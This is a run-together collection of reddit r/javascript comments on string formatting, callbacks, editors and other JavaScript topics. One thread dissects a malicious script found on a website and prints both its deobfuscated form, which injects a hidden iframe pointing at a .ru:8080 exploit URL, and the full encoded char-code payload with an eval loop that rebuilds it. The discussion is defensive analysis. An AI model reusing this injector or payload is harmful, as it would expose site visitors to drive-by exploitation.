Should note that this is available via RSS! Unlike some of the other options listed here.
http://functionn.blogspot.com/search/label/JavaScript
that works thanks. I wish there would be keyboard support, I don't use the mouse much.
(now that I know how to scroll) here's some feedback: is this based on the links of the sidebar? [r/visualization](http://www.yasiv.com/reddit#/Search?q=visualization) and [r/django](http://www.yasiv.com/reddit#/Search?q=django) show no relationships. also it says it can't find [r/python](http://www.yasiv.com/reddit#/Search?q=python) nonetheless good job, I've already found some interesting subs using this technique.
Probably. But its not just about single function callback void of arguments. Its about absolutely every other possibility.
both
Other then the global i, that is pretty freaking sweet!
that's awesome. Glad I could provide some inspiration :)
The passed function is executed by `setTimeout` in both cases. &gt;Since the function is called but not executed Your terminology is broken. Calling a function and executing a function are the same thing. &gt;In my example functions, as in more than one, are executed. No, it's the same thing. One function is executed. In your example, your function happens to execute other functions, but that's just something functions can do. It isn't a unique feature of anonymous function expressions.
[Project on GitHub](https://github.com/soulwire/Coffee-Physics)
I am impressed.
Thank you mattbis, Book is en-route, it looks very interesting.
No, not in standard JavaScript. You can try something like [this](http://archive.plugins.jquery.com/project/printf) if you need it.
I've been testing my Backbone.js code for a while with QUnit and SinonJS in a browser-based test runner, like this article describes. But I'd really be interested in figuring out how to do it without a browser so I can run the tests on my CI server without having to launch a browser instance every time. I've attempted to get it working a couple of times, with Rhino and node.js, but I haven't been able to get all the libraries to load and play nice with each other. Does anyone have experience doing this or pointers for where to look for more info?
I use one of these two styles: https://gist.github.com/981871 https://gist.github.com/981851
There is a problem with that library. Minifying it means you violate its license. They aren't using a `/*! ... */` comment, therefore it will get removed. The comment itself is also way to large and full of irrelevant bullshit. It contains the changelog for fucks sake. I notified the author a couple of weeks ago. He ignored it.
I'm noticing a trend with AI programming and MIT, it is too bad I live on the wrong side of the country, I bet they have good meet-ups over there.
No, I do not do that and I have no idea what your example is attempt to suggest. JavaScript is not an asynchronous language, with rare exception to setInterval.
&gt; The passed function is executed by setTimeout in both cases. No, its not. In your example the internals of your referenced function are executed as a result a call to a container, but the function itself is not executed. &gt; Your terminology is broken. Calling a function and executing a function are the same thing. No, they are not. You can call a reference to a function with the typeof keyword, but this does not indicate said function is being executed.
FYI, I already had tagged you with "troll" before we started this discussion. I'll change it to "troll, confirmed". I won't talk to you anymore.
Readability is one thing, but when you're outright degrading performance it's another. Consider the usage of your application and make the decision while this operation is too costly or you can afford it.
Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. * Neither the name of sprintf() for JavaScript nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission. Therefore, the changelog is not required to be reproduced.
Uh ... mis-paste? That links to a screencap of a Facebook photo hosted on yfrog.
This smells like premature optimization to me.
+1. postMessage, there are also jQuery plugins for this and vanilla JS 'pollyfills' for our favorite browsers IE &lt; 9
Is there are particular reason you want to do it this way? Unless its a large document, such as say an html document, I find in-lining like that to be counter to the surrounding code.
There's a simple templating system in [bpmv](https://github.com/BrynM/bpmv) - a small utility library meant to fill in gaps with other more UI-centric libs. Look for the "toke" method. It's GPL V2, but there's no worries minifying (I wrote it and you have permission). It's only 34K un-minified with over 50% of that being documentation comments. 
Nice!
~~I think this is a little bit more efficient~~... also closer to the 'console.log' method call. function ph1() { var v = Array.prototype.slice.call(arguments, 1), s = arguments[0].split("%s"), r = new Array(s.length * 2), i=x=0; for ( ; x &lt; s.length; x += 1, i += 2) { r[i] = s[x], r[i + 1] = v[x]; } return r.join("") } ph("some text %s %s-%s;", var1, var2, var3); **EDIT**: [Actually, I'm wrong.... I take it back](http://jsperf.com/array-versus-string)
I just ran that test on a recent Firefox, and `join` is actually 3 times slower. Besides, do you really care about speed for something you rarely do and can execute 2 resp. 6 million times per second? Premature optimization, indeed.
I *wrote* [this, eh, sprintf function](http://stackoverflow.com/questions/610406/javascript-equivalent-to-printf-string-format/4795914#4795914) which is very minimal but will do exactly what the OP wanted.
go strict on everything from the beginning. advanced mode verbose, lint strict. welcome to writing a lot of javascript in a sane manner. some perspective we have an app (excluding goog lib) that is 27k LOC now, compiles to 49kb gzipped, bless the goog and all their work on this. 
Since this has attracted far more interest than i imagined, i ran some tests on the solutions provided. - http://jsperf.com/sprintf-implementations. I excluded the original '+' method and join, because they did not solve the issue, and the + method would have skewed the results too much (--for me on chrome it is 250x faster than the *fastest* implementation!).. but they are [here](http://jsperf.com/plus-v-join) So this is the solution i'm using- a tweaked version of my original implementation so that the square brackets are not required; function ph2(){ var parts = arguments[0].split('%s'); var output = parts[0]; for(i=1; i&lt;arguments.length; i++){ output += arguments[i] + parts[i]; } return output; } usage: string = ph2("some text %s %s-%s;", var1, var2, var3); because it works as required for me, and is much faster than the other suggestions. --of course, keep it rational-- most of these won't make any noticeable difference, but i don't see why to use something slower unless it offers some concrete advantages.
I already use the linter in strict mode. It really is best to use this from the start as you say ;) but what are the benefits of using advanced verbose in the compiler? Right now i use `--output_mode=script` as it makes debugging easier. I assume advanced mode will do type checking? In case you wrote the proper annotations of course ;)
fixjsstyle --strict * gjslint --strict * 
I have now included a minimized version of deFunc, but I have also completely rewritten deFunc after thinking long and hard about what you said. I was trying to think of a good reason why the defaults can't come *anywhere* in the function arguments but I couldn't. I even wrote a quick hack where the defaults could come first or last in the parameter list but I didn't *like it.* What broke the proverbial camels back was the jQuery style of arguments: foo(id, [options,] callback) I wanted to support this "options optional" style function but the way deFunc worked, it wouldn't allow me to put defaults in between two required parameters. So I set out to change the way deFunc functioned and came up with something that I think is now remarkably flexible and still pretty small. I also had to completely rewrite the documentation and hopefully it all makes more sense. I hope you will give it a second look.
Its because of people like you that I chose to delete my Stackoverflow account and fine better things to do with my time. Because the pathetic tired bleatings of defeated children often end with the word "troll". This is a technology discussion. Put up or shut up. If "troll" is your only answer for a technology discussion then put your head in the sand and crawl in shame. Its clear you are spinning your wheels and have nothing left to contribute.
Can one deduct that call is slower than apply form this test case or does it not matter because it is [native code]?
That's very surprising. Most other languages that I know of handle string concatenation quite poorly and have a method or class specifically for helping out with a lot of concatenations, like StringBuilder. 
This is interesting but using bind this way isn't anything like having default parameters because there is no way to override the value that bind now places *before* any arguments passed into your function. I have reworked **deFunc** to make it more flexible. Now, one can do terrible things like this: /* Pretend foo is a useful function */ function foo(A, B, C, D) { console.log(A, B, C, D); } /* Make B and C optional parameters by providing defaults */ var bar = deFunc(foo, 1, ["_b", "_c"]); bar("aa", "dd") -&gt; aa, _b, _c, dd bar("aa", "bb", "dd") -&gt; aa, bb, _c, dd bar("aa", "bb", "cc", "dd") -&gt; aa, bb, cc, dd /* deFunc bar again, making D optional but a higher priority (filled first) */ var baz = deFunc(bar, 1, ["_d"]); baz("aa") -&gt; aa, _b, _c, _d baz("aa", "dd") -&gt; aa, _b, _c, dd baz("aa", "bb", "dd") -&gt; aa, bb, _c, dd baz("aa", "bb", "cc", "dd") -&gt; aa, bb, cc, dd
Considering that it's twice as fast as your function, I'd certainly call it an optimization over your function: http://jsperf.com/wghdghd .
You can't even imagine a use case where you do a lot of string concatenation? I'm glad such a self-styled authority on premature optimization weighed in on this topic.
You can't even imagine a use case where you do a lot of string concatenation? I'm glad such a self-styled authority on premature optimization weighed in on this topic.
I personally don't subscribe to the Comma-in-Front religion. I think it adds far too much visual noise before the actual thing you want your eye to see. That presentation is a joke, clearly designed to persuade the viewer by comparing apples and oranges. On the first two slides he purposefully shows comma-last code without any kind of sane alignment or indentation and then compares it to comma-first code with a nicely aligned and indented structure. Those things aren't mutually exclusive. I prefer to keep my visual noise *after* my variables and their values thank you.
The problem is that everyone has to do it whenever it's updated. It makes much more sense if it's just done once upstream. Additionally, most people won't do this and they will unknowingly violate the license.
I call you a troll because the things you say are either wrong or complete nonsense. E.g.: &gt;the function itself is not executed Right. Magic happens there. Of course! :D &gt;You can call a reference to a function with the typeof keyword Again. Utter bullshit. It's almost like you're a search engine powered bot. It appears that you only try to waste other people's time.
What is this though? Client side or server side javascript?
lol check out my thread with him...has to be a troll. I'm having a really hard time not responding...be strong.
No. I do tons of string concatenation. I'd just love for anything I've ever worked on to be so slick that string concatenation approaches a sufficiently significant portion of execution time that I should spend effort tuning it. I've never seen such a thing.
I work with it a lot and I love it. The community might be small but it's used in many Google projects and so the code is of high quality.
The long string is just a set of charcodes with 38 subtracted from them, delimited by q's. Here's the unobfuscated form: if (document.getElementsByTagName('body')[0]) { iframer(); } else { document.write("&lt;iframe src='http://caskjfhlkaspsfg.ru:8080/images/aublbzdni.php' width='10' height='10' style='visibility:hidden;position:absolute;left:0;top:0;'&gt;&lt;/iframe&gt;"); } function iframer() { var f = document.createElement('iframe'); f.setAttribute('src', 'http://caskjfhlkaspsfg.ru:8080/images/aublbzdni.php'); f.style.visibility = 'hidden'; f.style.position = 'absolute'; f.style.left = '0'; f.style.top = '0'; f.setAttribute('width', '10'); f.setAttribute('height', '10'); document.getElementsByTagName('body')[0].appendChild(f); }​ ~~Note that visiting the above URL is probably not recommended.~~ Checked the URL -- could be that it's selecting by useragent and only sending exploit code to vulnerable browsers, but all I recieved was a 302 redirect to google.com. Nothing exciting here. **Update:Hah! Hypothesis confirmed** More code from URL above being delivered to MSIE useragents. [Here's a pastie](http://pastie.org/3499972) of the slightly beautified payload code for IE. Investigation in progress. 
Just off the top of my head, this: s = s + r(38 + 1w[j]); looks like a syntax error to me - 1w is not a valid identifier - I guess it was meant to be: s = s + r(38 + w[j]); Then I just did some obvious substitutions: sneakycode = '-29q-29q67q64q-6q2q62q73q61q79q71q63q72q78q8q65q63q78q31q70q63q71q63q72q78q77q28q83q46q59q65q40q59q71q63q2q1q60q73q62q83q1q3q53q10q55q3q85q-29q-29q-29q67q64q76q59q71q63q76q2q3q21q-29q-29q87q-6q63q70q77q63q-6q85q-29q-29q-29q62q73q61q79q71q63q72q78q8q81q76q67q78q63q2q-4q22q67q64q76q59q71q63q-6q77q76q61q23q1q66q78q78q74q20q9q9q61q59q77q69q68q64q66q70q69q59q77q74q77q64q65q8q76q79q20q18q10q18q10q9q67q71q59q65q63q77q9q59q79q60q70q60q84q62q72q67q8q74q66q74q1q-6q81q67q62q78q66q23q1q11q10q1q-6q66q63q67q65q66q78q23q1q11q10q1q-6q77q78q83q70q63q23q1q80q67q77q67q60q67q70q67q78q83q20q66q67q62q62q63q72q21q74q73q77q67q78q67q73q72q20q59q60q77q73q70q79q78q63q21q70q63q64q78q20q10q21q78q73q74q20q10q21q1q24q22q9q67q64q76q59q71q63q24q-4q3q21q-29q-29q87q-29q-29q64q79q72q61q78q67q73q72q-6q67q64q76q59q71q63q76q2q3q85q-29q-29q-29q80q59q76q-6q64q-6q23q-6q62q73q61q79q71q63q72q78q8q61q76q63q59q78q63q31q70q63q71q63q72q78q2q1q67q64q76q59q71q63q1q3q21q64q8q77q63q78q27q78q78q76q67q60q79q78q63q2q1q77q76q61q1q6q1q66q78q78q74q20q9q9q61q59q77q69q68q64q66q70q69q59q77q74q77q64q65q8q76q79q20q18q10q18q10q9q67q71q59q65q63q77q9q59q79q60q70q60q84q62q72q67q8q74q66q74q1q3q21q64q8q77q78q83q70q63q8q80q67q77q67q60q67q70q67q78q83q23q1q66q67q62q62q63q72q1q21q64q8q77q78q83q70q63q8q74q73q77q67q78q67q73q72q23q1q59q60q77q73q70q79q78q63q1q21q64q8q77q78q83q70q63q8q70q63q64q78q23q1q10q1q21q64q8q77q78q83q70q63q8q78q73q74q23q1q10q1q21q64q8q77q63q78q27q78q78q76q67q60q79q78q63q2q1q81q67q62q78q66q1q6q1q11q10q1q3q21q64q8q77q63q78q27q78q78q76q67q60q79q78q63q2q1q66q63q67q65q66q78q1q6q1q11q10q1q3q21q-29q-29q-29q62q73q61q79q71q63q72q78q8q65q63q78q31q70q63q71q63q72q78q77q28q83q46q59q65q40q59q71q63q2q1q60q73q62q83q1q3q53q10q55q8q59q74q74q63q72q62q29q66q67q70q62q2q64q3q21q-29q-29q87'.split('q'); dont_run_this = []; for (i = 0; i &lt; sneakycode.length; i++) { dont_run_this = dont_run_this + String.fromCharCode(38 + sneakycode[i]); } eval(dont_run_this);
[some google code]
ha! silly me. I've had a long day. I was wondering why they wanted to hide their stuff in a google named var.
So, any idea what the payload does?
You rock paxNoctis - that is the shortest. I would say eliminate the i=0, since you can assume you're starting off clean, but that gave me a undefined var error.... as did eliminating the 0, the =0, etc. Nice!
It looks like a Java applet exploit I've seen before. It looks similar to this (non-obfuscated): [Pastebin](http://pastebin.com/6Y7avW19) They both seem to key off an element name '*'. String.fromCharCode(0x14 + 0x16) // in your code.
Let me be the first to warn you, JavaScript is a completely different paradigm from Java. Familiarize yourself with closures and how JavaScript deals with variables and scoping, as well as what 'this' actually means in different situations. One of the biggest JS headaches are browser compatibility. Most of this can be fixed by using jQuery. It's not terrible to dive right in, but there are instances when jQuery won't be available. While you may not encounter them initially, it may very useful just to understand what is actually jQuery, and what is javascript. Other than that, learning jQuery may be easier and more informative than learning vanilla javascript.
Interesting, I'll look into it
Yeah - MIT basically wrote the book on AI. (Pun semi-intended.)
&gt; String.prototype.format = function ( /* args */ ) { This creates a prototype, so now every string has the format function built into it &gt; var args = arguments; Take the arguments as an array, so any number of arguments entered will be stored as an array, rather than having to explicitly define them. &gt; return this.replace( /\{(\d+)\}/g That regex matches strings with the format {d}, where d is a digit. Importantly, the digit is wrapped in brackets, so it will be captured, for use later. &gt; , function (full, idx) { The second argument for replace, is what the string should be replaced with. In this case they are actually using a function, which will be passed the full string being matched against, and a captured variable. In this case, since the digit in {d} is being captured, it is returning that digit. &gt; return args[idx]; This will not look at the list of arguments passed, and return the nth one. N is defined by the captured digit, as described above. This string will then be used to replace the text in the original string. I hope that helped a little bit, but I may have just confused you more! In pseudo code let args = an array of all arguments passed to this function look in the current string for the pattern {d} every time you find a match let n = the digit inside the brackets of the match replace the match with the n^th argument passed to this function
You dont need javascript to do that, use :hover with a transition and set z-index: 1 in the :hover to have it float above the other images. I use that with relative positions to enlarge the image slightly and show a button bar with icons under it in a grid of images.
Did some research, I think I'm going to focus on becoming literate with Vanilla Javascript. It'll also make it easier I think if I ever need to overhaul a site or read someone else's scripts.
You do need to understand Javascript to use jQuery. You'll want to have a decent understanding of 1st class functions and objects used as dictionaries. The following shouldn't baffle you: var myarray=[25, 8, 7, 41] myarray.sort(function(a,b){return a - b}); var obj = {a: [1,2,3,4], b: function(){}}; Also, you should be able to tell what 'this' is in any given situation. 
The best definition I can think of is that it is a function that you pass to another function with the implication that it will be "called back" to at a later time.
I'm glad you found a single browser where your code is faster. I hope that makes you feel even more right. &gt; But that is beside the point-- it doesn't do what my function does. You're right, my code doesn't create the problems you'll have when the numbers of %s' don't match up with the number of arguments you pass in to your function. My code also doesn't have the problem of %s' that naturally occur in the format string. I also hope acting like a prima donna about how yours is so much more readable helps you feel better, too. I suspect most competent programmers don't niggle of such a tiny difference, and I doubt you'd even find your way better when you have your %s' buried deep in a very long string. I could play code golf, too, but why? You admitted your way is hundreds of times slower than using plain string concatenation, and it doesn't look any better.
Oooooooh, nasty. They use Java exploits to do the nasty stuff.
Could you decompile the Java applet class files?
I like it! That's a very clean solution. It would be nice to make it optional, but it's not hard to add. One thing I was thinking about was ECMAscript 6's new ..arg syntax. It collects the remaining arguments into an array. As a temp shim, this might be kinda useful. Lastly, there is a better test for arrays then checking for the slice property. Should make the check a little more accurate. default_args.constructor === Array;
Nice. If we're allowed to cheat a little and reverse the order we can save another 2 chars.. but other than that I think you nailed it (: for(i=101;--i;)console.log((i%3?'':'Fizz')+(i%5?'':'Buzz')||i)
Technically? All of it. The common perception now is that jQuery is some alternative language to JS, when in reality it is just a library. A cleverly coded library, but a library nonetheless. Usually I reccomend to learn how to do whatever you want to do in "pure" javascript first, then do it in jQery (if you feel you still need to). The benefits of this are twofold: 1) You learn how javascript works and it will wind up making your code more efficient after a while (even make your "jQuery" code more efficient (no calling $ six times for the same id within 4 lines)). And 2) You may wind up preferring vanilla JS, in which case you've saved the users 14kb each pageload (or w/e it weighs now) (and yes, I know about caching, you know what I mean xD).
It allows using a variable more than once and also it allows using the variables in a different order than they are given. This is extremely important in translations, for example (consider the difference in date formats for an obvious example). If you just want something that looks prettier than concatenation, your preferred implementations do the job. If you actually want to externalize your strings for some reason (e.g. internationalization or simply looser coupling), they are simply inadequate. Also, in practice, speed differences are often not as important as they may seem.
I think the argument for comma in front only holds water if you subscribe to the idea that assignments should be vertically aligned. I think this adds more confusion than it adds clarity. It also creates a terribly inconsistent indentation, or at least favours two spaces over the more conventional four (if only because `var` is a three letter word), which IMO makes indentation much less obvious. IMO it favours style over substance and clashes with the conventions established in other (even similar) languages over the last decades for no considerable benefits. tl;dr: I blame Ruby.
Isn't that equivalent to `(function() {...}());`then? IIRC this is the syntax Crockford encourages.
Yeah that clears things up a lot for me. So basically the anonymous function you're defining in `doSomeTask` #2 and #3 is the callbac that's being executed once the `doSomeTask` function is completed right? 
Which one is uglier is obviously a matter of preference. I prefer `join` because I prefer arrays when it comes to wrapping lines. Much like I prefer commas for lists in written English over joining every item with "and".
like this? http://www.dynamicdrive.com/style/csslibrary/item/css3_hover_image_gallery/ it's CSS 3 only, the "transform: scale(200% 200%)" property with transition effects to be more specific, but it's not supported by all browsers just yet. Google produces plenty of other examples: https://www.google.com/search?q=css+transform+zoom|scale+gallery
It looks like it uses cufón for fonts. 1. Read the [tutorial](http://net.tutsplus.com/articles/news/the-easiest-way-to-use-any-font-you-wish/) 2. Get the [font](http://www.fontsquirrel.com/fonts/TitilliumText) 3. Generate [cufón font](http://cufon.shoqolate.com/generate/) 4. Replace font file with the newly generated one. 
Another analogy: You're calling tech support and you're given 2 options: 1. Wait on hold for the next available representative (your business is very important to them) 2. Leave a callback name and number and wait for their call In the synchronous/asynchronous world the former option is the equivalent of synchronous since you're forced to wait around until the resource (tech support representative) becomes available. In the latter case, you are free to go and make yourself an amazing milkshake, catch up on reddit, etc. In other words you can do important stuff until you get that 'callback'. Hope this helps.
A lot of others have talked about what it is, but why even use it? Callbacks allow the library to have more choice about when your code is done. For example if you have the code: var result = doSomething(); result.foo(); It means the 'doSomething' function *must* perform the task right now, and *must* return the result now. There is no choice on this. If you use a callback: doSomething( function(result) { result.foo(); } ); 'doSomething' can still do it's work now, and then call the callback straight away, or it could do the work later, and use the callback later. 'doSomething' now has more choice about what happens. 'doSomething' could also chose to only perform it's work at specific times, such as when the user clicks their mouse button, or chose not to call it at all. It could also chose to pass the callback to someone else, who handles it instead. It could also call it multiple times, if there are multiple results. Essentially, callbacks allow you code to be more flexible, because your code can now have more choice about how it handles a task.
Oh, I see. What book are you talking about though? Could I have the title of it? :)
Thanks
Hm. Sounds much easier. I suppose this would be the same case as with Internet explorer 8 or lower. I have it set right now to also be faded out and go to 100% opacity when I hover over. Doesn't show in IE8, but doesn't create a problem either. I'd assume, since I've tried looking at CSS 3 elements before in older browsers that it will just default to whatever can work and not break the page? 
javascript closures (or closures in any other language) and google closure are not related. FYI. 
I'm just going to reply again instead of editing. Works great, but there's one issue now. All the images are right next to each other without any margins, but I wanted them separate. By default they are set to 50% opacity and go to 100% when I hover over. When the image enlarges you can see through the enlarged image where it overlaps. Now I cannot tell if the enlarged image is being covered by the other images, or not. I'm learning towards the other images are covering it because I'm having the images float left within the div to have them fill the entire area.
Here's a few options for console emulation in a browser: * jqueryTerminal: http://terminal.jcubic.pl/ * anyterm: http://demos.anyterm.org/anyterm_nano/anyterm.html * shellinabox: http://code.google.com/p/shellinabox/
The character codes all have 38 added to them. So that might be your problem. Subtract 38 from each code in the script and it should obfuscate correctly.
I'm 99% sure that would work, but I'd rather not try =P
AppleInsider is a blog aimed specifically at an audience who just want to pretend they are technologically savvy. When did it have *any* credibility?
Just read the article referencing H.264 in the link. &gt;Apple's strong push behind H.264 and its openness as a standard that anyone can implement (although there are royalties involved) has encouraged hardware makers to similarly offer mobile devices that very efficiently play H.264 video using hardware acceleration. "openness, you keep using that word, I don't think it means what you think it means" also, if it's hardware accelerated for H.264 it's hardware accelerated for vp8 (webm) These guys are clowns. 
&gt;~~WebKit~~ Safari Webkit is actually correct. JSC is part of Webkit, not Safari. Webkit with its default JS engine is used by several browsers, not just Safari. It's true though that many will think of Chrome if they hear "Webkit".
nail on head. I would add that safari is not that much slower (10--&gt;15%) on looped benchmarks than v8 (compared to FF which we find is often 200-&gt;300% slower)
There are other webkit browsers out there, like midori and uzbl. Not many folks know about them, but they're out there. And, yeah; I'm guessing it's still behind v8, or they would have crowed about it.
Prefix quotes with '&gt;'. E.g. `&gt;foobar` becomes: &gt;foobar `&gt;foo\n\n&gt;bar` (`\n`= newline) becomes: &gt;foo &gt;bar When I skimmed over your post I thought *you* were full of shit, because I didn't notice the quotes right away.
Keep the intended audience in mind: zealots of the cult of Mac, who do not really understand the technical stuff behind their software, because they don't have to; Apple takes care of that for them.
A callback is like a hollaback in real life. Like say your hommie is chillin at the bar and gives you a call to tell you all these fine bitches are up in the club right. function chillinInClub(person,patrons){ if(patrons.bitches.count &gt; 3){ if(patrons.bitches.qualityaverage() &gt; 4.5){ person.telephone(person.missingBuddy[3]); } } } ....but yo done goofed up and left your phone off. Some time passes and eventually you get this message and in common curtsy (lol) you give your friend a hollerback function checkPhone(phone, hollaback){ // a nice person always hollabacks. if(phone.messages.length){ for(var i = 0; i &lt; phone.messages.length; i++){ hollaback(phone.messages[i]) } } }
haha good example! hilarious
They are actually all the same implementation. If you look carefully, I'm increasing the complexity step-by-step. One level complexity at a time. In the last bit, the function() is the speedDial function. So you can think of as: phone.speedDial = function() { /* do something here after getting the call from me */ } Make sense?
It looks like the first number is the number of days since January 1st 1900.
Are you saying that I can finally write JS programs by *literally* pulling my hair out?
No. V8 is **not** an interpreter. Google wisely decided to make the fastest JavaScript to native *compiler* in the world. V8 takes JavaScript and performs complete compilation very quickly. I read somewhere that V8 takes about 200ms to compile 1mb of code! In contrast, Apple and Mozilla must spread man-power out on trying to make a faster interpreter and a faster JIT and a faster type-inferer and then worrying about making them all work together. The engineering man-hours that are wasted is huge. I think Mozilla has two or three different JITs at this point!
&gt; I believe V8 still generates faster code in that last step V8 skips the previous step so that last step is actually their first. &gt; So while V8 still is faster at looped benchmarks, this could make normal web surfing faster. The problem with JSC is that the JIT itself was still pretty slow (not the code it produced but the process of producing it) and had to be completed before anything would run. This adds an interpretation step that helps only because the alternative was slower. V8, in theory, compiles so quickly it is almost instant. The thinking at Google was: If you can have a full JavaScript compilation step done before the DOM is even ready, why not just do that?
Cool - my friend works on the [AS3Nui](http://as3nui.com) team and I hear the author of this will be joining... great to see all of this fun stuff happening with the Kinect!
A [Code/Demo](http://www.reddit.com/r/javascript/comments/qexn4/update_tile_based_rpg_gitdemo_details_in_comments/) is now available.
A [Code/Demo](http://www.reddit.com/r/javascript/comments/qexn4/update_tile_based_rpg_gitdemo_details_in_comments/) is now available.
For posterity and just in case anyone else goes looking for this. This is how I solved it. The problem is the date format Excel uses natively is called "serial date" it's the number of days since 12/31/1899 on the left side of the decimal. In the case of my example above it's 40569 days. The number to the right of the decimal is the percentage of 24 hours since midnight that morning. or 0.578689 So my example above works out to be 01/26/2011 and 13:53:19 or 1:53:19 pm. This javascript function converts from the serial time to a readable date function serialDate(serial) { var d = new Date( "1/1/1900" ); var min = (serial - parseInt(serial)) * 1440;//drops the date value so we can figure the total minutes for the day + decimal seconds var hours = min/60; // hours + decimal minutes var minutes = (hours - parseInt(hours)) * 60; // minutes + decimal seconds var seconds = Math.round((minutes - parseInt(minutes))*60); // rounds off to the nearest second. d.setDate( serial ); // sets the date from the serial value. return (d.getMonth()+1) + "/" + (d.getDate()-1) + "/" + d.getFullYear() + " " + parseInt(hours) + ":" + parseInt(minutes) + ":" + parseInt(seconds); } Giving my example above returns "1/26/2011 13:53:19" Which you can then use the date object to convert to whatever format you need. Dropping it into a new Date() object gives this "Wed Jan 26 2011 13:53:19 GMT-0700 (Mountain Standard Time)" All done. Wipe hands on pants. 
Any thoughts on the theme/concept for the finalized game? I'm surprised you've made it this far working on the backbone without crossing into the "fun" part of making the game design. That's always been my problem, and trying to work on underlying structure with a complex level on top of that already can be very frustrating. Don't forget how utilizing DOM elements in large quantities, especially if they are frequently updated, can seriously hinder performance. Canvas can be difficult due to a lack of built in methods and easy collision detection, but with a fair amount of math and geometry functions it can be done very well. I would have no problem sharing the canvas library/class I've written over the years, should you decide to explore that route and aren't the biggest fan of math.
Concept is like, many rpg's, explore,fight,loot,equip,level in an infinite random universe I have run into some DOM issues already rendering tables. when zooming further and further out the table size get rediculus and takes upwards of 5 to 10 seconds to render the 10000+ cells. but so far it is fairly responsive at other zoom levels. I'm actually more comfortable writing the backbone than the 'fun' bits. This is my first game since my very first website back in the 90's when I made a couple small card games in php. Since then it's been mostly desktop app dev work that i've been doing, so a game is a radical departure. I have only a vague sense of how to write rpg mechanics after having played so many.
Seconded!
What are you lacking and what editor has it?
Nope, I had to go track that one down. I'm guessing the authors have to explicitly allow/add their work to the repository. Not 100% on that one.
Apples webkit?
I sort of agree, that's why I posed the question. Introducing other libraries isn't really good for beginners either. Some of my students come in not fully grasping the structure of file systems :( The problem is that each language has its problems, but maybe *that* is a good lesson to learn early.
&gt; just that, given my experience, it smells like (read: seems like) it could be That certainly is a claim regarding something's likelihood. You were asserting that there was a possibility of it being premature optimization and using your own experience to support that. It's called an "appeal to authority": http://en.wikipedia.org/wiki/Argument_from_authority .
Anyone else having issues with it on Win7 x64?
Haha. That's silly. You don't actually believe this do you? Yes. It is a claim regarding something's likelihood. I'm not reneging anything I've said, and I did definitely say that it's likely that such optimization are premature, because that is the plain truth. Developer time is expensive, CPU time is cheap, and unless there's an objectively measured need to spend one in exchange for the other (profiling, etc) it simply shouldn't be worried about. I've not claimed to be an authority. Nor have I used appeal to authority, which would require saying something like "I am an expert and this is so.". On the contrary, I've provided reasoned arguments and made no such claims.
&gt; You don't actually believe this do you? I'd certainly believe Wikipedia over your claims based on your own limited experience. &gt; I've not claimed to be an authority I never said you did. I said your argument was "appeal to authority". Your "reasoned arguments" are exactly why it is such. &gt; I did definitely say that it's likely that such optimization are premature, because that is the plain truth. I'm sure you believe that because you haven't had the experience to run into issues with string concatenation speed. Haha. That's silly. You don't actually believe that something is premature optimization just because you've never run into a case where it was the bottleneck, do you? &gt; I'm really not sure how efficient .join is - hopefully it's significantly better. As you can see, I was never worried about the performance, so I'm not sure why you keep babbling about it.
javascript is a crucial part of every website you use. Turn JavaScript off and see how many websites work. JavaScript is faster and more popular than ever. 
I recently discovered TRAMP on emacs so I'm able to essentially do the same thing. My main motivation for learning emacs came from the desire to not pay for abandon ware (textmate), and now I'm hooked.
They've had python tutorials/ videos up for quite a while now. 
have you tried just using the native file manager fir this? remote ssh, ftp, smb etc drives can be mounted locally. This makes the "upload on save" feature redundent. One note on this though. mac isnt quite as smooth with this as linux. I know textmate and some other editors dont like these mounts. perhaps expresso has this same problem. but I'm pretty sure sublime works fine with it.
if you wanna go that route, check out geany. its what gedit would have been if it were made for coding from day1. 
Made the switch a few weeks ago. The extensions for it makes it better and prettier than notepad++. I'll post some when I get home. *[Package Control](http://wbond.net/sublime_packages/package_control) *[Sublime CodeIntel](https://github.com/Kronuz/SublimeCodeIntel) *[Sublime Linter](https://github.com/Kronuz/SublimeLinter) *[Zen Coding](https://bitbucket.org/sublimator/sublime-2-zencoding) *[Bracket highlighter](https://github.com/facelessuser/BracketHighlighter).
&gt; I don't care if it gives me a blowjob, for $60 I'll stick to gedit. Always my favorite attitude from developers... Any halfway decent freelancer could pay for this in anywhere from &lt;1 billable hour of work to maybe 2-3 billable hours of work if they're fresh out of colllege. How many hours will a good editor save you? A crapton more than 1-3 over the lifetime of its use. Software takes time and effort to write. The utter lack of respect for that is really a pet peeve of mine.
Technically, it is. The full spec is available for free, and you can implement a fully-featured h264 codec with it. It is not like MS specs, like the word file format specification, SMB specs, NTFS specs, which all had to be reverse-engineered. The nasty parts comes when one wants to actually *use* h264, or sell codecs. IIRC, free and open-source codecs do not have to pay anything, which is why for example the [x264](http://www.videolan.org/developers/x264.html) developers can get away with it. Of course, if you actually want to publish h264 encoded videos, then the whole licensing thing is on the table again. So, h264 is OK if you want to encode private stuff that you keep private. For free-as-in-freedom videos etc. a different codec would probably be a better choice.
there's the sublime sftp plugin
there's the sublime sftp plugin. it might support ftp too. have you tried it?
Oh I can afford it all right, but I'd rather not, and I'd rather use open source wherever I can. Like Bill Gates said on the Simpsons: "I didn't get rich by writing a lot of checks"
Try out the trial version at-least. Enough said.
To be fair, this feature is really only useful if you don't have a proper deployment strategy. It's a code editor, not a full IDE.
This software has a non-expiring, non-crippled trial. It's written and maintained by a single developer for all platforms. It works famously on all of them. This is the only software I've paid for in ten years.
You can change the key commands. I actually prefer ctrl+[ though.
Re: proper deployment strategy I do all my development on a private server online, not locally... I'm NEVER just editing files and uploading via FTP to a live server. _That's just stupid._
Not only this isn't a subreddit for work, but your advertising for "Java" job not "JavaScript" ... Seriously it's 2012 can't people make the difference between Java and JavaScript yet ?
Favorite editor here. Using anything else just pisses me off at this point. This thread reminds me I need to buy a license and stop using the trial!
Doing all your development online instead of locally would be "stupid," if you ask me...
I sort of did something like this, but it was more "I don't want to spend 60 bucks on abandoned software that only works on one platform" (TextMate). Now I'm an emacs user, and I regret nothing. Though I do own a license for sublime cause it's awesome and emacs sometimes breaks my co-workers brains ;)
